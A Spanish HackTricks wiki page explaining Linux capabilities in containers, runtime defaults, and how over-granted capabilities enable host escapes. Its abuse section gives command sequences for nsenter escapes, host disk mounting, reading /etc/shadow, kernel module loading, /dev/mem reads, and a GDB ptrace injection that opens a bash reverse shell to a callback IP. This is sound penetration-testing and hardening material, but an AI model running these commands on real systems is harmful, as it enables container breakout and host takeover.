# Capacidades de Linux en contenedores

{{#include ../../../../banners/hacktricks-training.md}}

## Descripción general

Las capacidades de Linux son una de las piezas más importantes de la seguridad de los contenedores porque responden a una pregunta sutil pero fundamental: **¿qué significa realmente «root» dentro de un contenedor?** En un sistema Linux normal, históricamente el UID 0 implicaba un conjunto de privilegios muy amplio. En los kernels modernos, esos privilegios se descomponen en unidades más pequeñas llamadas capacidades. Un proceso puede ejecutarse como root y aun así carecer de muchas operaciones potentes si se han eliminado las capacidades correspondientes. <sup>[[1]](#references)</sup>

Los contenedores dependen mucho de esta distinción. Muchas cargas de trabajo siguen iniciándose como UID 0 dentro del contenedor por razones de compatibilidad o simplicidad. Sin eliminar capacidades, esto sería demasiado peligroso. Al eliminarlas, un proceso root dentro de un contenedor puede seguir realizando muchas tareas ordinarias dentro del contenedor, pero se le deniegan operaciones del kernel más sensibles. Por eso, que un shell en un contenedor muestre `uid=0(root)` no significa automáticamente «root en el host» ni siquiera «amplios privilegios del kernel». Los conjuntos de capacidades determinan cuánto poder tiene realmente esa identidad root.

Para consultar la referencia completa de las capacidades de Linux y muchos ejemplos de abuso, consulta:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Funcionamiento

Las capacidades se registran en varios conjuntos, incluidos los conjuntos permitted, effective, inheritable, ambient y bounding. En muchas evaluaciones de contenedores, la semántica exacta de cada conjunto en el kernel es menos importante de inmediato que la pregunta práctica final: **¿qué operaciones privilegiadas puede realizar correctamente este proceso ahora mismo y qué ganancias futuras de privilegios siguen siendo posibles?** <sup>[[1]](#references)</sup>

Esto importa porque muchas técnicas de escape son, en realidad, problemas de capacidades disfrazados de problemas de contenedores. Una carga de trabajo con `CAP_SYS_ADMIN` puede acceder a una enorme cantidad de funciones del kernel que un proceso root normal dentro de un contenedor no debería poder usar. Una carga de trabajo con `CAP_NET_ADMIN` se vuelve mucho más peligrosa si también comparte el namespace de red del host. Una carga de trabajo con `CAP_SYS_PTRACE` resulta mucho más interesante si puede ver procesos del host mediante el uso compartido del PID del host. En Docker o Podman, esto puede aparecer como `--pid=host`; en Kubernetes, suele aparecer como `hostPID: true`.

En otras palabras, el conjunto de capacidades no se puede evaluar de forma aislada. Hay que analizarlo junto con los namespaces, seccomp y la política MAC.

## Laboratorio

Una forma muy directa de inspeccionar las capacidades dentro de un contenedor es:

```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```

También puedes comparar un contenedor más restrictivo con otro al que se le hayan añadido todas las capabilities:

```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Para ver el efecto de añadir una capacidad limitada, prueba a quitarlo todo y volver a añadir solo una capacidad:

```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```

Estos pequeños experimentos ayudan a demostrar que un runtime no se limita a activar o desactivar un booleano llamado "privileged". Está configurando la superficie de privilegios real disponible para el proceso.

## Capabilities de alto riesgo

Las capabilities solo se convierten en primitivas de escape cuando su operación alcanza un **recurso controlado por el host**. Las combinaciones de alto riesgo recurrentes son:

- **`CAP_SYS_ADMIN`** junto con un PID del host, un dispositivo de bloques o una ruta de control del kernel con permisos de escritura. Unirse al mount namespace de un objetivo también requiere `CAP_SYS_CHROOT`; montar un sistema de archivos basado en bloques requiere `CAP_SYS_ADMIN` en el user namespace inicial.
- **`CAP_SYS_PTRACE`** junto con visibilidad de los PID del host y un proceso del host al que se pueda adjuntar. No se requiere `CAP_SYS_ADMIN` para la inyección mediante ptrace.
- **`CAP_DAC_OVERRIDE` o `CAP_DAC_READ_SEARCH`** junto con un sistema de archivos del host accesible. Estas capabilities omiten distintas comprobaciones DAC, pero no crean una vista del sistema de archivos del host.
- **`CAP_SYS_MODULE`** en el user namespace inicial junto con un módulo aceptado y compatible con el kernel. Los contenedores Linux convencionales comparten el kernel del nodo; los runtimes de VM o de kernel en espacio de usuario cambian ese límite.
- **`CAP_MKNOD`** en el user namespace inicial junto con un dispositivo real del host que el device cgroup ya permita. Crear un nodo no omite el device cgroup.
- **`CAP_SYS_RAWIO`** junto con una interfaz de memoria, puerto de E/S, PCI o control de dispositivo expuesta y utilizable.
- **`CAP_SYS_BOOT`** junto con el PID namespace inicial para reiniciar el host, o una ruta kexec utilizable y permitida para reemplazar el kernel.
- **`CAP_NET_ADMIN`** en el network namespace del host para controlar directamente el estado de red del nodo. **`CAP_NET_RAW`** puede formar parte de un escape específico de un protocolo, pero los raw sockets por sí solos no proporcionan una shell en el nodo.

`CAP_SYS_CHROOT` no se incluye deliberadamente como capability de escape independiente. Puede ser necesario para `setns()` en un mount namespace y facilitar el uso de un árbol del host que ya sea accesible, pero `chroot()` por sí solo no expone ese árbol ni concede nuevos permisos sobre el sistema de archivos. Del mismo modo, `CAP_BPF` y `CAP_PERFMON` exponen una potente telemetría y superficie de ataque del kernel, pero, sin una vulnerabilidad independiente del kernel, sus operaciones habituales no permiten escapes genéricos de contenedores.

## Uso en runtimes

Docker, Podman, las pilas basadas en containerd y CRI-O utilizan controles de capabilities, pero los valores predeterminados y las interfaces de gestión varían. Docker las expone directamente mediante flags como `--cap-drop` y `--cap-add`. Podman ofrece controles similares y suele combinarlos con la ejecución rootless como capa de seguridad adicional. Kubernetes permite añadir y eliminar capabilities mediante el `securityContext` del Pod o del contenedor; los runtimes de nivel inferior expresan los conjuntos resultantes en la configuración del runtime OCI. Los entornos de contenedores de sistema, como LXC e Incus, también dependen del control de capabilities, pero su integración más amplia con el host puede llevar a los operadores a relajar los valores predeterminados más de lo que harían con un contenedor de aplicaciones. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

El mismo principio se aplica a todos ellos: que sea técnicamente posible conceder una capability no significa que se deba conceder. Muchos incidentes reales empiezan cuando un operador añade una capability simplemente porque una carga de trabajo falla con una configuración más estricta y el equipo necesita una solución rápida.

## Errores de configuración

El error más evidente es **`--cap-add=ALL`** en las CLI de tipo Docker/Podman, pero no es el único. En la práctica, un problema más habitual es conceder una o dos capabilities extremadamente potentes, especialmente `CAP_SYS_ADMIN`, para "hacer que la aplicación funcione", sin comprender también las implicaciones para los namespaces, seccomp y los mounts. Otro fallo habitual es combinar capabilities adicionales con el uso compartido de namespaces del host. En Docker o Podman esto puede aparecer como `--pid=host`, `--network=host` o `--userns=host`; en Kubernetes, la exposición equivalente suele aparecer en ajustes de la carga de trabajo como `hostPID: true` o `hostNetwork: true`. Cada una de esas combinaciones cambia lo que la capability puede afectar en la práctica.

También es habitual que los administradores crean que, porque una carga de trabajo no está completamente en modo `--privileged`, sigue estando significativamente restringida. A veces es así, pero otras veces la configuración efectiva ya se acerca lo suficiente al modo privileged como para que, en la práctica, la diferencia deje de importar.

## Abuso

Empieza por registrar los conjuntos efectivos, el mapeo del user namespace, el estado de seccomp, los namespaces, los mounts y los dispositivos. El nombre de una capability, sin este contexto, no demuestra que sea posible un escape:

```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```

### `CAP_SYS_ADMIN`: espacios de nombres y dispositivos de bloques

Con visibilidad de los PID del host, `CAP_SYS_ADMIN` permite entrar en los espacios de nombres del host. La operación del espacio de nombres de montaje también requiere `CAP_SYS_CHROOT` en el espacio de nombres de usuario del proceso que la ejecuta.

**Comprueba la capacidad y el confinamiento:**

```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```

**Enumera el objetivo:** confirma que se comparten los PID del host mediante la configuración del contenedor/Pod o una lista inequívoca de procesos del host; después, inspecciona los namespaces del objetivo. También existe un PID 1 local en los namespaces PID privados, así que su mera presencia no demuestra que se compartan los PID del host.

```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```

**Explotar la ruta del namespace:**

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```

Las comprobaciones de capabilities deben superarse en los user namespaces que poseen los objetivos. `--pid=host` o `hostPID: true` en Kubernetes proporciona visibilidad, pero no proporciona las capabilities.

Para la ruta alternativa del dispositivo de bloques, **enumera** los candidatos y luego **exploit** el sistema de archivos accesible montando primero el candidato validado en modo de solo lectura:

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```

El nodo de dispositivo debe existir, el cgroup de dispositivos debe permitirlo y los montajes de sistemas de archivos de bloques requieren `CAP_SYS_ADMIN` en el espacio de nombres de usuario inicial. Una raíz del host que ya está montada mediante bind en `/host` proporciona acceso al host **sin** `CAP_SYS_ADMIN`; `chroot /host` es solo una comodidad y requiere por separado `CAP_SYS_CHROOT`.

### Raíz del host accesible: ejecución directa desde el sistema de archivos

Si la raíz del host ya está montada en `/host`, primero confirma el montaje y luego usa directamente el acceso existente. Esta ruta no depende de `CAP_SYS_ADMIN`:

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```

Si `chroot()` no está disponible, pero el binario del host es compatible con la arquitectura y el cargador del contenedor, a menudo se puede invocar a través del árbol montado:

```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```

Las lecturas y escrituras directas en `/host` ya comprometen el sistema de archivos del host. `chroot()` o ejecutar un binario del host solo hace que ese acceso sea más cómodo; ninguna de las dos operaciones crea el mount del host ni omite un mount de solo lectura o una política MAC.

### `CAP_SYS_PTRACE`: inyección en procesos del host

Con visibilidad de los PID del host y `CAP_SYS_PTRACE` en el user namespace del objetivo, GDB puede hacer que un proceso aprobado del host llame a `system()`. No se requiere `CAP_SYS_ADMIN`.

**Comprueba la capability y los controles de conexión:**

```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```

**Enumera y selecciona un objetivo prescindible:** confirma que se comparten los PID del host mediante la configuración o una lista inequívoca de procesos del nodo; nunca selecciones el PID 1 ni un demonio crítico.

```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
  "/proc/${target_pid}/status"
```

**Exploit the selected process:**

```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
  -ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
  -ex detach
```

El objetivo debe permitir la conexión y tener un símbolo `system()` utilizable y una ruta de payload de Bash. Yama, el estado no volcadable, seccomp, los user namespaces y la política MAC pueden bloquear la cadena. GDB detiene el objetivo mientras está conectado, así que usa solo un proceso de laboratorio desechable.

### `CAP_DAC_OVERRIDE` y `CAP_DAC_READ_SEARCH`: archivos protegidos del host

Estas capabilities no exponen el sistema de archivos del host. Si `/host` ya es un montaje del host, `CAP_DAC_READ_SEARCH` puede omitir las comprobaciones DAC de lectura y búsqueda, y `CAP_DAC_OVERRIDE` también puede omitir las comprobaciones de escritura ordinarias:

**Comprueba las capabilities:**

```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Enumera el sistema de archivos del host expuesto y los permisos del objetivo:**

```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
  /host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```

**Pon a prueba los bypasses de lectura y escritura** en un laboratorio desechable:

```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```

Un montaje de solo lectura y las reglas de LSM siguen aplicándose. `CAP_DAC_READ_SEARCH` también autoriza `open_by_handle_at()`, pero un breakout como Shocker requiere además un descriptor de archivo de montaje para el mismo sistema de archivos subyacente, handles válidos o localizables, un diseño compatible del sistema de archivos/almacenamiento y que ningún runtime ni LSM lo bloquee. No proporciona acceso arbitrario a todos los sistemas de archivos fuera del namespace de montaje.

### `CAP_SYS_MODULE`: ejecución en el kernel compartido

En un contenedor Linux ordinario, un módulo aceptado se ejecuta en el kernel compartido del host.

**Comprueba la capacidad y el ámbito del user namespace:**

```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Enumera los requisitos previos para la carga de módulos:**

```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
  "/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```

**Ejecuta el exploit solo con un módulo de prueba compatible y revisado previamente en un nodo desechable:**

```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```

La capability debe estar activa en el espacio de nombres de usuario inicial. La versión y configuración del kernel, las firmas de módulos, el lockdown, seccomp y la política de LSM deben permitir la carga. Kata, gVisor, el aislamiento de Hyper-V y runtimes similares cambian qué límite del kernel alcanza la carga de trabajo.

### `CAP_MKNOD`: crear un identificador de dispositivo permitido

`CAP_MKNOD` crea un nodo de dispositivo, pero no elude el cgroup de dispositivos. La creación de dispositivos no está namespaced, por lo que la capability debe estar activa en el espacio de nombres de usuario inicial.

**Comprobar la capability y el alcance del espacio de nombres de usuario:**

```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Enumera los dispositivos reales, sus números mayor/menor y cualquier lista de permitidos visible de cgroup-v1:**

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
  printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```

**Exploit un candidato validado de la familia ext en modo de solo lectura:**

```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Otros sistemas de archivos necesitan una herramienta de solo lectura equivalente; montar el dispositivo también requiere `CAP_SYS_ADMIN`. `Operation not permitted` al abrir el nodo creado suele indicar que el cgroup de dispositivos todavía lo bloquea. En cgroup v2, el acceso a dispositivos suele aplicarse con BPF y no existe ningún archivo `devices.list`, por lo que una apertura exitosa es la prueba decisiva.

### `CAP_SYS_RAWIO`: interfaz de E/S sin procesar expuesta

No existe un payload genérico portable: las direcciones válidas y sus efectos dependen del hardware y de la configuración del kernel.

**Comprueba la capacidad y el ámbito del user namespace:**

```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Enumera las interfaces sin procesar, el hardware y los controladores expuestos:**

```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

**Exploit solo con una prueba aprobada para el dispositivo y el rango de direcciones identificados.** Si `/dev/mem` es la interfaz aprobada para el laboratorio, esta plantilla demuestra la divulgación de la memoria del nodo sin imprimir su contenido:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

La dirección debe obtenerse del mapa de hardware del laboratorio, ya que leer algunas regiones MMIO puede tener efectos secundarios. Un comando genérico de escritura en memoria sería engañoso e inseguro: la misma dirección puede ser inocua en una máquina y controlar hardware o memoria del kernel en otra. Los cgroups de dispositivos, los permisos del sistema de archivos, las restricciones estrictas de `/dev/mem`, el kernel lockdown, la virtualización y las políticas de LSM suelen impedir un acceso útil.

### `CAP_SYS_BOOT`: reinicio del namespace o reemplazo del kernel

En un namespace PID privado, `reboot()` termina el proceso init de ese namespace en lugar de reiniciar el host. Por lo tanto, reiniciar el host requiere el namespace PID inicial, normalmente mediante el uso compartido de los PID del host. Una ruta de kexec también requiere una imagen del kernel compatible y políticas de lockdown/firma permisivas:

**Comprueba la capability:**

```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```

**Enumera los requisitos previos de PID namespace y kexec:** confirma que el workload comparte los PID del host según su configuración, porque un enlace a un PID namespace por sí solo no revela si es el namespace inicial del nodo.

```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

**Exploit solo cuando reiniciar un nodo de laboratorio desechable sea el ejercicio explícito:**

```bash
sync
reboot -f
```

No ejecutes ese comando ni cargues un kernel en un nodo compartido solo para demostrar la capacidad. En un espacio de nombres PID privado, solo termina el proceso init de ese espacio de nombres y no demuestra un impacto en el host.

### `CAP_NET_ADMIN` y `CAP_NET_RAW`: rutas de red del host

`CAP_NET_ADMIN` afecta solo al espacio de nombres de red actual.

**Comprueba las capacidades y el aislamiento:**

```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```

**Enumera la red actual y confirma el uso de la red del host en la configuración de la carga de trabajo:**

```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```

**Prueba `CAP_NET_ADMIN` de forma reversible:** con la red del host, la interfaz temporal es una interfaz del nodo.

```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```

`CAP_NET_RAW` permite sockets RAW y PACKET, pero no proporciona un shell genérico del host. Para **enumerar** la cadena documentada de GCE, comprueba la ruta de metadatos y captura si el tráfico en texto plano del agente invitado es observable:

```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```

Si existen los requisitos previos correspondientes, **exploit** la cadena específica del entorno tal como se documenta en [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): captura la solicitud y el estado de secuencia, inyecta la respuesta de metadatos falsificada que contiene una clave SSH y luego valida el acceso al host. La cadena requería root, host networking, `CAP_NET_ADMIN`, `CAP_NET_RAW`, tráfico de metadatos GCE en texto claro y una solicitud del guest agent susceptible a una race condition; el transporte o el comportamiento del agente modernos pueden impedirlo.

### Restricciones de origen local y direcciones de interfaz

Un listener puede rechazar conexiones cuyo origen sea `127.0.0.1`, pero pasar por alto otra dirección asignada al mismo namespace de red. Si se puede acceder al listener desde esa interfaz, compara una conexión loopback con otra vinculada a una dirección local no loopback existente. `CAP_NET_ADMIN` puede permitir configurar interfaces en el namespace actual, pero no es necesario si ya hay asignada una dirección adecuada. `CAP_NET_RAW` no es un requisito previo para una conexión TCP normal. Se trata de un fallo en la clasificación de la dirección de origen, no de un escape de contenedor ni de una prueba de que la aplicación vaya a autorizar una solicitud privilegiada.<sup>[[1]](#references)[[7]](#references)</sup>

En un listener WebSocket, una respuesta HTTP válida `101 Switching Protocols` confirma que se completó el handshake inicial; un error posterior a nivel de aplicación puede indicar que la conexión llegó al handler. Ninguna de las dos respuestas demuestra que la autenticación o la operación solicitada hayan tenido éxito.<sup>[[8]](#references)</sup>

## Comprobaciones

El objetivo de las comprobaciones de capabilities no es solo volcar valores sin procesar, sino entender si el proceso tiene privilegios suficientes para que la situación actual de sus namespaces y montajes resulte peligrosa.

```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```

Qué resulta interesante aquí:

- `capsh --print` es la forma más sencilla de detectar capabilities de alto riesgo, como `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` o `cap_sys_module`.
- La línea `CapEff` de `/proc/self/status` indica qué capabilities son efectivas en este momento, no solo cuáles podrían estar disponibles en otros conjuntos.
- Un volcado de capabilities cobra mucha más importancia si el contenedor también comparte los namespaces de PID, red o usuario del host, o tiene montajes del host con permisos de escritura.

Después de recopilar la información sin procesar sobre las capabilities, el siguiente paso es interpretarla. Comprueba si el proceso es root, si los user namespaces están activos, si se comparten los namespaces del host, si seccomp está aplicando restricciones y si AppArmor o SELinux siguen restringiendo el proceso. Un conjunto de capabilities, por sí solo, es solo una parte de la historia, pero a menudo es la parte que explica por qué un container breakout funciona y otro falla, aunque ambos partan de una situación aparentemente idéntica.

## Valores predeterminados del runtime

| Runtime / plataforma | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual habitual |
| --- | --- | --- | --- |
| Docker Engine | Conjunto de capabilities reducido de forma predeterminada | Docker mantiene una lista de permitidos predeterminada de capabilities y descarta el resto | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Conjunto de capabilities reducido de forma predeterminada | Los contenedores de Podman no tienen privilegios de forma predeterminada y usan un modelo de capabilities reducido | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Hereda los valores predeterminados del runtime, a menos que se cambien | Si no se especifica `securityContext.capabilities`, el contenedor recibe el conjunto de capabilities predeterminado del runtime | `securityContext.capabilities.add`, no incluir `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O bajo Kubernetes | Normalmente, valores predeterminados del runtime | El conjunto efectivo depende del runtime y de la especificación del Pod | Igual que en la fila de Kubernetes; la configuración directa de OCI/CRI también puede añadir capabilities explícitamente |

En Kubernetes, lo importante es que la API no define un único conjunto universal de capabilities predeterminado. Si el Pod no añade ni elimina capabilities, la carga de trabajo hereda los valores predeterminados del runtime de ese nodo.

{{#include ../../../../banners/hacktricks-training.md}}

## References

- [1] [capabilities(7) - página del manual de Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - configuración de contenedores Linux](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - privilegios del runtime y capabilities de Linux](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Documentación de Kubernetes - establecer capabilities para un contenedor](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Documentación de Podman - `--cap-add` y `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Documentación de Incus - seguridad](https://linuxcontainers.org/incus/docs/main/explanation/security/)
- [7] [ip(7) - implementación del protocolo IPv4 de Linux](https://man7.org/linux/man-pages/man7/ip.7.html)
- [8] [RFC 6455 - el protocolo WebSocket](https://www.rfc-editor.org/rfc/rfc6455.html)
